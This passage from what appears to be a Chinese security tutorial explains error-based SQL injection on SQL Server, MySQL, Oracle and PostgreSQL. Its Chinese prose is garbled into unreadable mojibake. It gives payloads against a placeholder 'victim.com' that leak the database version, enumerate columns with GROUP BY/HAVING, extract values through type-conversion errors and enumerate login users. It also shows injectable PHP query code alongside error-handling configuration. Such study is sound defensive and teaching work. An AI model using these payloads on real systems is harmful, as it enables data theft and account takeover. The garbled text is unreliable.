class="headerlink" title="ä¿¡æ¯å·¥ä½œæµ"></a>ä¿¡æ¯å·¥ä½œæµ</h5><p><img src="https://z3.ax1x.com/2021/07/19/WJ2Fts.png" alt="WJ2Fts.png"></p><h4 id="æ•°æ®åº“é”™è¯¯"><a href="#æ•°æ®åº“é”™è¯¯" class="headerlink" title="æ•°æ®åº“é”™è¯¯"></a>æ•°æ®åº“é”™è¯¯</h4><p>å°±æ˜¯ä¸Šæ–‡æåˆ°çš„æŠ¥é”™</p><h5 id="å¸¸è§çš„sqlæ¼æ´"><a href="#å¸¸è§çš„sqlæ¼æ´" class="headerlink" title="å¸¸è§çš„sqlæ¼æ´"></a>å¸¸è§çš„sqlæ¼æ´</h5><h6 id="Sql-Serveré”™è¯¯"><a href="#Sql-Serveré”™è¯¯" class="headerlink" title="Sql Serveré”™è¯¯"></a>Sql Serveré”™è¯¯</h6><p>å‡è®¾åœ¨victim.comåº”ç”¨ä¸­æ‰¾åˆ°äº†ä¸€ä¸ªåä¸ºshowproducts.phpçš„é¡µé¢ï¼Œé¡µé¢è„šæœ¬æ¥æ”¶åä¸ºid çš„å‚æ•°å¹¶æ ¹æ®idå‚æ•°çš„å€¼æ˜¾ç¤ºå•ä¸ªå•†å“ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœå°†idå‚æ•°çš„å€¼ä¿®æ”¹æˆä¸‹åˆ—å†…å®¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproduct.aspx?id=attacker</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åº”ç”¨ä¼šè¿”å›ç±»ä¼¼äºä¸‹åˆ—å†…å®¹çš„é”™è¯¯ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Server Error <span class="token operator">in</span> <span class="token string">'/'' Application.Invalid column name '</span>attacker<span class="token string">'.Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Exception Details: System.Data.SqlClient.SqlException: Invalid column name '</span>attacker'<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™ä¸ªé”™è¯¯çš„åŸºç¡€ä¸Šï¼Œå¯ä»¥çŒœæƒ³ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­åº”ç”¨åˆ›å»ºçš„SQLè¯­å¥åº”å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šè¿°è¯­å¥è¿”å›çš„ç»“æœé›†æ˜¯idproductå­—æ®µç­‰äº2æ—¶çš„å•†å“ã€‚å¦‚æœæ³¨å…¥ä¸€ä¸ªéæ•°å­—å€¼ï¼Œæ¯”å¦‚ attacker,é‚£ä¹ˆæœ€ç»ˆå‘é€ç»™æ•°æ®åº“æœåŠ¡å™¨çš„SQLè¯­å¥å°†å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> products <span class="token keyword">WHERE</span> idproduct<span class="token operator">=</span>attacker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>è¿™é‡Œmssqlè®¤ä¸ºattackerä¸æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œé‚£ä¹ˆä»–å°±æ˜¯ä¸ªåˆ—å</strong></p><p>ç„¶åæœåŠ¡å™¨ä»æ•°æ®åº“ä¸­æŸ¥æ‰¾attackeråˆ—ï¼Œæ²¡æ‰¾åˆ°å°±è¿”å›äº†<code>Invalid column name 'attacker'.</code></p><p>è¿™é‡Œçš„attackerå°±å¯ä»¥åšæ–‡ç« </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and l=0/@@ version;--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¼ å…¥å‚æ•°<code>' and 1=0/@@version;--</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Microsoft SQL Server 2000 - 8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988 - 2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790:)'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„æŠ¥é”™å’Œä¸Šé¢æ˜¯ä¸€ä¸ªæ ¼å¼ï¼Œé”™è¯¯ä¿¡æ¯å±•ç¤ºäº†<code>@@version</code>æŸ¥è¯¢çš„å†…å®¹</p><p>åŸç†ï¼šmssqlçš„ç±»å‹è½¬æ¢åŠŸèƒ½ï¼Œ<code>0/@@version</code>é™¤æ³•è¿ç®—ï¼Œsqlå°†è¿™ä¸¤ä¸ªæ“ä½œæ•°éƒ½ä½œä¸ºæ“ä½œæ•°ï¼Œå°†<code>@@version</code>å½“åšæ•°å­—è§£æï¼Œæ“ä½œå¤±è´¥ï¼Œå°†è¿”å›äº†è¿™ä¸ªé”™è¯¯ã€‚æ¢æˆå…¶ä»–å‚æ•°ä¹Ÿæ˜¯ä¸€ä¸ªåŸç†ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">è¿˜æœ‰ä¸€äº›æŠ€æœ¯å¯ç”¨äºæ˜¾ç¤ºæ•°æ®åº“æ‰§è¡Œçš„è¯­å¥çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ä½¿ç”¨<span class="token keyword">having</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>ï¼šhttp:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' having '1' ='1</span>åº”ç”¨å“åº”å¦‚ä¸‹ï¼šServer Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span><span class="token keyword">Column</span> <span class="token string">'products.productid'</span> <span class="token operator">is</span> invalid <span class="token operator">in</span> the <span class="token keyword">select</span> list because it <span class="token operator">is</span> <span class="token operator">not</span> contained <span class="token operator">in</span> an aggregate <span class="token keyword">function</span> <span class="token operator">and</span> there <span class="token operator">is</span> <span class="token keyword">no</span> <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> clause<span class="token punctuation">.</span>Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>havingå­—å¥å’Œgroup by å­—å¥ç»“åˆä½¿ç”¨ï¼Œåœ¨selectä¸­ä½¿ç”¨havingè¿‡æ»¤group by ï¼Œgroup byè¦æ±‚selectè¯­å¥é€‰æ‹©çš„å­—æ®µæ˜¯æŸä¸ªèšåˆå‡½æ•°çš„ç»“æœï¼Œæˆ–è€…åŒ…å«åœ¨group by å­—å¥ä¸­ï¼Œå¦‚æœä¸æ»¡è¶³ï¼Œé‚£ä¹ˆæ•°æ®åº“è¿”å›ä¸€ä¸ªé”™è¯¯ï¼Œæ˜¾ç¤ºé”™è¯¯çš„ç¬¬ä¸€åˆ—ï¼Œè¯¥æŠ€æœ¯å¯ä»¥ç”¨æ¥æšä¸¾è¡¨çš„åˆ—ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid having '1' ='1</span><span class="token comment">#products.name</span>http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' group by productid,name having '1' ='1</span><span class="token comment">#products.price</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç”¨ä¸Šé¢æåˆ°ç±»å‹è½¬æ¢é”™è¯¯æ£€ç´¢åˆ—å¯¹åº”çš„å€¼</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/showproducts.aspx?category=bikes' and 1=0/name;--</span>Server Error <span class="token operator">in</span> <span class="token string">'/'</span> Application<span class="token punctuation">.</span>Syntax error converting the nvarchar <span class="token keyword">value</span> <span class="token string">'Claud Butler Olympus D2'</span> <span class="token keyword">to</span> a <span class="token keyword">column</span> <span class="token keyword">of</span> <span class="token keyword">data</span> <span class="token keyword">type</span> <span class="token keyword">int</span><span class="token punctuation">.</span>Description: An unhandled exception occurred during the execution <span class="token keyword">of</span> the <span class="token keyword">current</span> web request<span class="token punctuation">.</span> Please review the stack trace <span class="token keyword">for</span> more information about the error <span class="token operator">and</span> <span class="token keyword">where</span> it originated <span class="token operator">in</span> the code<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨èº«ä»½éªŒè¯æœºåˆ¶ä¸­ï¼Œå¯èƒ½æšä¸¾åˆ°ç”¨æˆ·åå’Œå¯†ç çš„åˆ—ï¼Œè¿™æ ·ä¾¿å¯èƒ½ç™»å½•æœ‰ç®¡ç†å‘˜æƒé™çš„è´¦å·ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/logon.aspx?username=test' and User not in ('Admin') and l=0/User and '1' ='1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªpayloadå°†Adminç”¨æˆ·æ’é™¤ï¼ŒæŸ¥æ‰¾å…¶ä»–ç”¨æˆ·</p><p>å…³é—­ASP.NETä¸­æœåŠ¡å™¨å‘è¿œç¨‹è®¿é—®è€…æ˜¾ç¤ºè¯¦ç»†é”™è¯¯ä¿¡æ¯</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">web.config&lt;configuration&gt;&lt;system.web&gt;&lt;customErrors mode="Off"/&gt;&lt;/system.web&gt;&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¾ç½®é”™è¯¯é‡å®šå‘</p><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">&lt;configuration&gt;&lt;system.web&gt;&lt;customErrorsdefaultRedirect="Error.aspx" mode="On"ã€‰&lt;errorstatusCode="403H redirect='*AccessDenied.aspxn/&gt;&lt;errorstatusCode="404" redirect="NotFound.aspx"/&gt;&lt;errorstatusCode="500" redirect="InternalError.aspx"/&gt;&lt;/customErrors&gt;&lt;/system.web&gt;&lt;/configuration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="Mysqlé”™è¯¯"><a href="#Mysqlé”™è¯¯" class="headerlink" title="Mysqlé”™è¯¯"></a>Mysqlé”™è¯¯</h6><p>å¸¸è§é”™è¯¯ä»£ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: mysql_fetch_array<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid MySQL result resource <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>showproduct<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™ä¸ªæŠ¥é”™æ˜¯<code>mysql_fetch_array()</code>äº§ç”Ÿçš„</p><p>mysqlä¸€èˆ¬ç”¨<code>mysql_error()</code>æ¥å±•ç¤ºé”™è¯¯</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token prolog">&lt;?php//è¿æ¥æ•°æ®åº“ mysql_connect("[database]", "[user]", "[password]") or//æ£€æŸ¥é”™è¯¯ï¼Œå¤„ç†æ— æ³•è®¿é—®æ•°æ®åº“çš„æƒ…å†µdie("Could not connect: ".mysql_error());//é€‰æ‹©æ•°æ®åº“mysql_select_db("[database_name]");//ä»GETè¯·æ±‚ä¸­è·å–categoryå€¼$category = $_GET["category"];//åˆ›å»ºå¹¶æ‰§è¡Œä¸€æ¡SQLè¯­å¥$result = mysql_query("SELECT * from products where category='$category'")ï¼›if (!$result) { //å¦‚æœæœ‰ä»»ä½•é”™è¯¯//æ£€æŸ»é”™è¯¯å¹¶æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯die("&lt;p&gt;Error: '.mysql_error().'&lt;/p&gt;');} else {//éå†æŸ»è¯¢ç»“æœwhile ($row = mysql_fetch_array($result.MYSQL_NUM)){printf ("ID: %s Name: %s", $row[0], $row[1]);}//é‡Šæ”¾ç»“æœé›†mysql_free_result($result);?&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¼ å…¥å•å¼•å·åšå‚æ•°ï¼ŒæŠ¥é”™ï¼Œè¿™æ˜¯mysql_error()äº§ç”Ÿçš„</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span>' at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¼ å…¥ä¸€ä¸ªä¸æ˜¯å­—ç¬¦ä¸²çš„ï¼ˆä¸åœ¨å•å¼•å·å†…ï¼‰ä½œå‚æ•°ï¼Œä¾¿ä¼šè¢«è§£ææˆåˆ—åï¼ŒæŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: Unknown <span class="token keyword">column</span> <span class="token string">'attacker'</span> <span class="token operator">in</span> <span class="token string">'where clause'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å’Œmssqlæœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™</p><h6 id="Oracleé”™è¯¯"><a href="#Oracleé”™è¯¯" class="headerlink" title="Oracleé”™è¯¯"></a>Oracleé”™è¯¯</h6><p>å¸¸è§é”™è¯¯</p><p>æ‰§è¡Œäº†è¯­æ³•ä¸Šä¸æ­£ç¡®çš„SQLè¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">180</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">208</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Oracleæ•°æ®åº“æ£€æµ‹åˆ°SQLè¯­å¥ä¸­æœ‰ä¸€ä¸ªä½¿ç”¨å•å¼•å·å¼•èµ·æ¥çš„å­—ç¬¦ä¸²æœªè¢«æ­£ç¡®ç»“æŸï¼ŒOracleè¦æ±‚å­—ç¬¦ä¸²å¿…é¡»ä½¿ç”¨å•å¼•å·ç»“æŸã€‚æ³¨å…¥ä¸€ä¸ªå•å¼•å·æ—¶ä¼šå‘ç°äº§ç”Ÿäº†ä¸‹åˆ—é”™è¯¯ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Error: SQLExceptionjava<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.NETç¯å¢ƒä¸‹çš„æ³¨å…¥å•å¼•å·æƒ…å†µï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Exception Details: System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: One <span class="token operator">or</span> more <span class="token keyword">errors</span> occurred during processing <span class="token keyword">of</span> command<span class="token punctuation">.</span>ORA<span class="token operator">-</span><span class="token number">00933</span>: <span class="token keyword">SQL</span> command <span class="token operator">not</span> properly ended<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†ä».NETåº”ç”¨è¿”å›çš„ä¸€ä¸ªé”™è¯¯ï¼Œè¯¥ç¨‹åºæ‰§è¡Œçš„è¯­å¥ä¸­åŒ…å«æœªä½¿ç”¨å•å¼•å· å¼•èµ·æ¥çš„å­—ç¬¦ä¸²ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span>System<span class="token punctuation">.</span>Web<span class="token punctuation">.</span>HttpUnhandledException: Exception <span class="token keyword">of</span> <span class="token keyword">type</span><span class="token string">'System.Web.HttpUnhandledException'</span> was thrown<span class="token punctuation">.</span><span class="token comment">--&gt;</span>System<span class="token punctuation">.</span><span class="token keyword">Data</span><span class="token punctuation">.</span>OleDb<span class="token punctuation">.</span>OleDbException: ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>PHPçš„ociparse()å‡½æ•°ç”¨äºå‡†å¤‡è¦æ‰§è¡Œçš„Oracleè¯­å¥ã€‚ä¸‹é¢æ˜¯è¯¥å‡½æ•°è°ƒç”¨å¤±è´¥æ—¶PHPå¼•æ“ äº§ç”Ÿçš„ä¸€ä¸ªé”™è¯¯ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociparse <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">.</span>ociparse<span class="token punctuation">]</span> : ORA<span class="token operator">-</span><span class="token number">01756</span>: quoted string <span class="token operator">not</span> properly <span class="token keyword">terminated</span> <span class="token operator">in</span> <span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>victim<span class="token punctuation">.</span>com<span class="token operator">/</span>ocitest<span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœociparse()å‡½æ•°è°ƒç”¨å¤±è´¥ä¸”æœªå¯¹è¯¥é”™è¯¯è¿›è¡Œå¤„ç†ï¼Œé‚£ä¹ˆåº”ç”¨ä¼šå› ä¸ºç¬¬ä¸€æ¬¡å¤±è´¥è€Œæ˜¾ç¤ºä¸€ äº›å…¶ä»–é”™è¯¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Warning: ociexecute<span class="token punctuation">(</span><span class="token punctuation">)</span>: supplied argument <span class="token operator">is</span> <span class="token operator">not</span> a valid OCI8<span class="token operator">-</span>Statement resource <span class="token operator">in</span> c:\www\victim<span class="token punctuation">.</span>com\oracle\<span class="token keyword">index</span><span class="token punctuation">.</span>php <span class="token keyword">on</span> line <span class="token number">31</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ†ææŠ¥é”™ä»£ç </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">java<span class="token punctuation">.</span><span class="token keyword">sql</span><span class="token punctuation">.</span>SQLException: ORA<span class="token operator">-</span><span class="token number">00907</span>: missing <span class="token keyword">right</span> parenthesis atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>dbaccess<span class="token punctuation">.</span>DBError<span class="token punctuation">.</span>throwSqlException<span class="token punctuation">(</span>DBError<span class="token punctuation">.</span>java:<span class="token number">134</span><span class="token punctuation">)</span> at oracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTIoer<span class="token punctuation">.</span>processError<span class="token punctuation">(</span>TTIoer<span class="token punctuation">.</span>java:<span class="token number">289</span><span class="token punctuation">)</span> atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>Oall7<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>Oall7<span class="token punctuation">.</span>java:<span class="token number">582</span><span class="token punctuation">)</span> atoracle<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span>ttc7<span class="token punctuation">.</span>TTC7Protocol<span class="token punctuation">.</span>doOall7<span class="token punctuation">(</span>TTC7Protocol<span class="token punctuation">.</span>java:<span class="token number">1986</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ•°æ®åº“æŠ¥å‘ŠSQLè¯­å¥ä¸­å­˜åœ¨â€missing right parenthesisâ€(ç¼ºå°‘å³æ‹¬å·)é”™è¯¯ã€‚å¾ˆå¤šåŸå› ä¼šå¼•å‘è¯¥é”™è¯¯ã€‚æœ€å¸¸è§çš„æƒ…å†µæ˜¯æ”»å‡»è€…åœ¨åµŒå¥—SQLè¯­å¥ä¸­æ‹¥æœ‰æŸç§æ§åˆ¶æƒã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> fieldl<span class="token punctuation">,</span> field2<span class="token punctuation">,</span>    <span class="token comment">/* é€‰æ‹©ç¬¬ä¸€å’Œç¬¬äºŒä¸ªå­—æ®µ */</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> fieldl        <span class="token comment">/* å¼€å§‹å­æŸ¥è¯¢ */</span><span class="token keyword">FROM</span> table2<span class="token keyword">WHERE</span> something <span class="token operator">=</span> <span class="token punctuation">[</span>attacker controlled variable<span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment">/* ç»“æŸå­æŸ¥è¯¢ */</span><span class="token keyword">as</span> field3                        <span class="token comment">/*ä»å­æŸ»è¯¢è¿”å›*/</span><span class="token keyword">FROM</span> tablel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šè¿°ä¾‹å­å±•ç¤ºäº†ä¸€ä¸ªåµŒå¥—æŸ¥è¯¢ã€‚ä¸»SELECTè¯­å¥æ‰§è¡Œæ‹¬å·ä¸­çš„å¦ä¸€æ¡SELECTè¯­å¥ã€‚å¦‚æœæ”»å‡»è€…å‘ç¬¬äºŒæ¡æŸ¥è¯¢è¯­å¥æ³¨å…¥æŸäº›å†…å®¹å¹¶å°†åé¢çš„SQLè¯­å¥æ³¨é‡Šæ‰ï¼Œé‚£ä¹ˆOracleå°†è¿”å›â€missing right parenthesisâ€ é”™è¯¯ã€‚</p><h6 id="PostgreSQLé”™è¯¯"><a href="#PostgreSQLé”™è¯¯" class="headerlink" title="PostgreSQLé”™è¯¯"></a>PostgreSQLé”™è¯¯</h6><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//è¿æ¥å¹¶é€‰æ‹©æ•°æ®åº“</span><span class="token variable">$dbconn</span> <span class="token operator">=</span> <span class="token function">pg_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"host=localhost dbname=books user=tom password=myPassword"</span><span class="token punctuation">)</span><span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect:'</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//æ‰§è¡ŒSQLæŸ¥è¯¢</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM \"public\".\"Authors\" WHERE name='<span class="token interpolation"><span class="token variable">$name</span></span>'"</span><span class="token punctuation">;</span> <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">pg_query</span><span class="token punctuation">(</span><span class="token variable">$dbconnz</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Query failed: '</span><span class="token operator">.</span><span class="token function">pg_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†æŸ¥è¯¢ç»“æœä»¥THTMLå½¢å¼è¾“å‡º</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;table&gt;\n"</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">pg_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token constant">PGSQL_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;tr&gt;\n"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token keyword">as</span> <span class="token variable">$col_value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t\t&lt;td&gt;<span class="token interpolation"><span class="token variable">$col_value</span></span>&lt;/td&gt;\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\t&lt;/tr&gt;\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/table&gt;\n"</span><span class="token punctuation">;</span><span class="token comment">//é‡Šæ”¾ç»“æœé›†</span><span class="token function">pg_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å…³é—­è¿æ¥</span><span class="token function">pg_close</span><span class="token punctuation">(</span><span class="token variable">$dbconn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>pg_query</code>ä½¿ç”¨ä¼ å…¥çš„æ•°æ®åº“æ‰§è¡ŒsqlæŸ¥è¯¢è¯­å¥</p><p><code>pg_last_error</code>è·å–æ•°æ®åº“è¿æ¥çš„æœ€æ–°å‡ºé”™ä¿¡æ¯</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//www.victim.com/list_author.php?name='</span>Query failed: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"''"</span><span class="token keyword">SQL</span>ä»£ç ç”±äºå…¶ä»–åŸå› æ‰§è¡Œå¤±è´¥æ—¶<span class="token punctuation">,</span>PostgreSQLæ•°æ®åº“å°†è¿”å›ä¸€ä¸ªå¸¸è§„é”™è¯¯ï¼šQuery failed: ERROR: syntax error at <span class="token operator">or</span> near <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PostgreSQLå¼€å‘ï¼Œåˆ©ç”¨PostgreSQL JDBC Driver</p><p>PostgreSQL JDBC Driverå¤„ç†ç¼ºå°‘ç»“æŸå¼•å·çš„å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæœ‰ä¸‹é¢çš„æŠ¥é”™</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>util<span class="token punctuation">.</span>PSQLException: ERROR: unterminated quoted string at <span class="token operator">or</span> near <span class="token string">"'\' "</span>at org<span class="token punctuation">.</span>postgresql<span class="token punctuation">.</span>core<span class="token punctuation">.</span>v3<span class="token 